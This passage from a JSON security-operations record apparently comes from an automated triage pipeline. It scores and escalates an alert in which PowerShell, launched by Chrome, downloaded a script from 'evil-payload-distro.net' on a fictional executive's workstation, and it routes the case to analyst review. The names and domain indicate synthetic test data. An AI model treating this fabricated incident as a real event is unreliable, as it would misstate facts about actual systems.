                "explanation": "Judge marked priority 'high'.",
                "score_impact": 10
              },
              {
                "title": "Inventory risk",
                "explanation": "Elevated user/asset risk_score from inventory.",
                "score_impact": 9
              },
              {
                "title": "Human review default",
                "explanation": "Inconclusive or escalated verdict — analyst validation required.",
                "score_impact": 8
              }
            ],
            "headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82.",
            "why_verdict": "Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story.",
            "signal_notes": [],
            "why_priority": "Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue.",
            "recommended_action": "Human review required before disposition — do not auto-close. Judge recommended: Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity."
          },
          "signals": [],
          "mapped_from": {
            "judge.verdict": "needs_investigation",
            "judge.priority": "high",
            "judge.confidence": "medium",
            "review_verdict_raw": "NEEDS_HUMAN_REVIEW"
          },
          "source_track": "security",
          "triage_score": 82,
          "review_verdict": "NEEDS_HUMAN_REVIEW",
          "confidence_score": 0.65,
          "needs_human_review": true,
          "priority_rationale": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82. Judge verdict 'needs_investigation' is inconclusive, mixed, or needs_more_evidence — defaulting to NEEDS_HUMAN_REVIEW until an analyst validates the story. Triage score 82/100 places this alert in the 'critical' band. NEEDS HUMAN REVIEW verdicts with higher Judge priority, inventory risk, and routing ambiguity score higher in the analyst queue. Judge rationale: Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero ad",
          "investigation_priority": "critical"
        },
        "summary": "Critical executive workstation showed PowerShell invoked by Chrome to download a script from an unverified domain; while threat intel shows no detections, the asset and user have high risk scores and similar alerts (C2 and scheduled task) raise suspicion, requiring focused investigation.",
        "verdict": "needs_investigation",
        "priority": "high",
        "rationale": "Risk_context flags the endpoint (critical) and user (executive) with risk_score=9 each, indicating a high impact if compromised. Although threat_intel finds the domain undetected, the lack of malicious hits does not outweigh the asset risk. Defender's benign hypothesis relies on missing corroborating data, but no change‑management record or extension evidence is available yet. Hunter notes zero additional events but highlights correlation with similar alerts: a critical outbound C2 event and a high‑priority scheduled task on the same host, suggesting a possible multi‑stage intrusion. Therefore, the balance of evidence leans toward a suspicious scenario requiring immediate, concrete data collection via Splunk to confirm or refute malicious intent.",
        "confidence": "medium",
        "triage_score": 82,
        "review_verdict": "NEEDS_HUMAN_REVIEW",
        "resolved_user_id": "WAYNECORPINC\\bwayne",
        "resolved_asset_id": "t8372-desktop-bruce",
        "needs_human_review": true,
        "recommended_next_step": "Run targeted Splunk searches to collect the full PowerShell process tree, any child processes, network connections to evil-payload-distro.net, and file creation events on DESKTOP-BRUCE, then review the results for malicious activity.",
        "investigation_priority": "critical",
        "triage_report_headline": "CRITICAL priority — NEEDS HUMAN REVIEW — score 82."
      },
      "tsoc_record_type": "soc_investigation_summary"
    },
    "row_index": 0
  },
